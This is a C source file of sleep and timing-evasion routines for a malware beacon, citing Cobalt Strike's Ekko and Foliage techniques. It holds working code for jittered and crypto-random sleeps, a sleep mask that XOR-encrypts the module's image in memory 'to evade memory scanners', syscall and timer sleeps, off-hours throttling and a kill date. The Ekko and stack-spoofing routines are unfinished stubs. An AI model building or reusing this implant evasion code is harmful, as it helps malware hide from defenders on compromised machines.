/*
 * Jitter & Sleep - Timing evasion
 * Cobalt Strike Ekko, Foliage patterns
 */

#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

// ============================================================================
// CONFIG
// ============================================================================

DWORD g_sleep = 5000;
BYTE  g_jitter = 20;

// ============================================================================
// BASIC JITTER
// ============================================================================

DWORD jitter_sleep(void)
{
    if(g_jitter == 0) return g_sleep;

    DWORD range = (g_sleep * g_jitter) / 100;
    DWORD rnd = GetTickCount() % (range * 2 + 1);
    return g_sleep - range + rnd;
}

// ============================================================================
// CRYPTO RANDOM
// ============================================================================

DWORD jitter_crypto(void)
{
    DWORD rnd;
    HCRYPTPROV hP;

    if(CryptAcquireContextA(&hP, 0, 0, 1, 0xF0000000)) {  // PROV_RSA_FULL, CRYPT_VERIFYCONTEXT
        CryptGenRandom(hP, sizeof(rnd), (BYTE*)&rnd);
        CryptReleaseContext(hP, 0);
    } else {
        rnd = GetTickCount() ^ (GetTickCount() >> 16);
    }

    DWORD range = (g_sleep * g_jitter) / 100;
    return g_sleep - range + (rnd % (range * 2 + 1));
}

// ============================================================================
// SLEEP MASK
// ============================================================================

typedef struct {
    BYTE* base;
    SIZE_T size;
    BYTE  key[32];
} MASK;

MASK g_mask = {0};

void mask_init(void)
{
    HMODULE hMod = GetModuleHandleA(0);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMod;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dos->e_lfanew);

    g_mask.base = (BYTE*)hMod;
    g_mask.size = nt->OptionalHeader.SizeOfImage;

    DWORD tick = GetTickCount();
    for(int i = 0; i < 32; i++)
        g_mask.key[i] = (BYTE)(tick >> (i % 4) * 8) ^ i;
}

void mask_xor(BYTE* buf, SIZE_T len, BYTE* key)
{
    for(SIZE_T i = 0; i < len; i++)
        buf[i] ^= key[i % 32];
}

void masked_sleep(DWORD ms)
{
    DWORD old;
    VirtualProtect(g_mask.base, g_mask.size, 0x04, &old);  // PAGE_READWRITE

    mask_xor(g_mask.base, g_mask.size, g_mask.key);

    Sleep(ms);

    mask_xor(g_mask.base, g_mask.size, g_mask.key);

    VirtualProtect(g_mask.base, g_mask.size, old, &old);
}

// ============================================================================
// WAIT SLEEP
// ============================================================================

void wait_sleep(DWORD ms)
{
    HANDLE hE = CreateEventA(0, 0, 0, 0);
    WaitForSingleObject(hE, ms);
    CloseHandle(hE);
}

void wait_alertable(DWORD ms)
{
    HANDLE hE = CreateEventA(0, 0, 0, 0);
    WaitForSingleObjectEx(hE, ms, 1);
    CloseHandle(hE);
}

// ============================================================================
// SYSCALL SLEEP
// ============================================================================

typedef LONG (NTAPI* NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);

void syscall_sleep(DWORD ms)
{
    static NtDelayExecution_t pNt = 0;

    if(!pNt) {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        pNt = (NtDelayExecution_t)GetProcAddress(ntdll, "NtDelayExecution");
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -(LONGLONG)ms * 10000;

    pNt(0, &interval);
}

// ============================================================================
// TIMER SLEEP
// ============================================================================

void timer_sleep(DWORD ms)
{
    HANDLE hT = CreateWaitableTimerA(0, 1, 0);

    LARGE_INTEGER due;
    due.QuadPart = -(LONGLONG)ms * 10000;

    SetWaitableTimer(hT, &due, 0, 0, 0, 0);
    WaitForSingleObject(hT, INFINITE);
    CloseHandle(hT);
}

// ============================================================================
// BUSY WAIT
// ============================================================================

void busy_wait(DWORD ms)
{
    DWORD start = GetTickCount();
    volatile int x = 0;

    while(GetTickCount() - start < ms) {
        x++;
        if(x % 1000000 == 0) Sleep(1);
    }
}

// ============================================================================
// WORKING HOURS
// ============================================================================

BOOL is_workhours(void)
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    if(st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5) {
        if(st.wHour >= 9 && st.wHour < 18) {
            return 1;
        }
    }
    return 0;
}

DWORD adaptive_sleep(void)
{
    if(is_workhours()) {
        return jitter_sleep();
    }
    // Off hours - longer sleep
    DWORD old = g_sleep;
    g_sleep = 300000;  // 5 min
    DWORD s = jitter_sleep();
    g_sleep = old;
    return s;
}

// ============================================================================
// KILL DATE
// ============================================================================

BOOL is_expired(WORD year, BYTE month, BYTE day)
{
    SYSTEMTIME st;
    GetSystemTime(&st);

    if(st.wYear > year) return 1;
    if(st.wYear == year && st.wMonth > month) return 1;
    if(st.wYear == year && st.wMonth == month && st.wDay > day) return 1;

    return 0;
}

// ============================================================================
// EKKO SLEEP (concept)
// ============================================================================

/*
 * Ekko technique:
 * 1. Create timer with APC callback
 * 2. APC triggers CONTEXT switch
 * 3. Use ROP to: VirtualProtect -> XOR -> Sleep -> XOR -> VirtualProtect
 * 4. Memory encrypted during entire sleep
 *
 * Full implementation requires ROP chain construction
 */

typedef VOID (NTAPI* RtlCaptureContext_t)(PCONTEXT);
typedef LONG (NTAPI* NtContinue_t)(PCONTEXT, BOOLEAN);

void ekko_sleep(DWORD ms)
{
    // Simplified - full impl in Cobalt Strike's Ekko BOF

    HANDLE hTimer = CreateWaitableTimerA(0, 1, 0);
    HANDLE hEvent = CreateEventA(0, 0, 0, 0);

    CONTEXT ctx;
    RtlCaptureContext_t pCapture = (RtlCaptureContext_t)GetProcAddress(
        GetModuleHandleA("ntdll"), "RtlCaptureContext");
    pCapture(&ctx);

    // Would queue APC with modified context for ROP
    // For now, just alertable wait
    LARGE_INTEGER due;
    due.QuadPart = -(LONGLONG)ms * 10000;
    SetWaitableTimer(hTimer, &due, 0, 0, 0, 0);

    WaitForSingleObjectEx(hTimer, INFINITE, 1);

    CloseHandle(hTimer);
    CloseHandle(hEvent);
}

// ============================================================================
// STACK SPOOFING SLEEP
// ============================================================================

/*
 * During sleep, call stack reveals beacon origin
 * Stack spoofing: modify return addresses
 */

typedef struct {
    PVOID rip;
    PVOID rsp;
    PVOID rbp;
} FRAME;

void spoof_sleep(DWORD ms)
{
    // Save real stack frames
    // Replace with fake frames (ntdll, kernel32)
    // Sleep
    // Restore real frames

    // Concept - full impl is complex
    wait_sleep(ms);
}

// ============================================================================
// RANDOMIZED SLEEP METHOD
// ============================================================================

void random_sleep(DWORD ms)
{
    int method = GetTickCount() % 5;

    switch(method) {
        case 0: Sleep(ms); break;
        case 1: wait_sleep(ms); break;
        case 2: syscall_sleep(ms); break;
        case 3: timer_sleep(ms); break;
        case 4: wait_alertable(ms); break;
    }
}

// ============================================================================
// BEACON SLEEP
// ============================================================================

void beacon_sleep(void)
{
    DWORD ms = jitter_crypto();

    // Check kill date
    if(is_expired(2025, 12, 31)) {
        ExitProcess(0);
    }

    // Adaptive based on time
    if(!is_workhours()) {
        ms = ms * 10;  // 10x longer off-hours
    }

    // Masked sleep to evade memory scanners
    if(g_mask.base) {
        masked_sleep(ms);
    } else {
        random_sleep(ms);
    }
}

// ============================================================================
// EOF
// ============================================================================
